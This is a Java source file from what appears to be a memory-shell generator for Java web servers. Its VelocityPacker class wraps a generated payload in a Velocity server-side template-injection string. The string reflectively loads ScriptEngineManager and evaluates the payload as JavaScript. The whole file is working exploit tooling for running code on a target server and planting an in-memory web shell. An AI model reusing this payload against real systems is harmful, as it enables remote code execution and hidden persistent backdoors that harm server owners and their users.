package com.reajason.javaweb.memshell.packer.velocity;

import com.reajason.javaweb.memshell.Packers;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class VelocityPacker implements Packer {
    String template = "#set($x='') #set($cz = $x.class.forName('javax.script.ScriptEngineManager')) $cz.getDeclaredConstructor(null).newInstance().getEngineByName('js').eval('{{script}}')";

    @Override
    public String pack(GenerateResult generateResult) {
        String script = Packers.ScriptEngine.getInstance().pack(generateResult);
        return template.replace("{{script}}", script);
    }
}
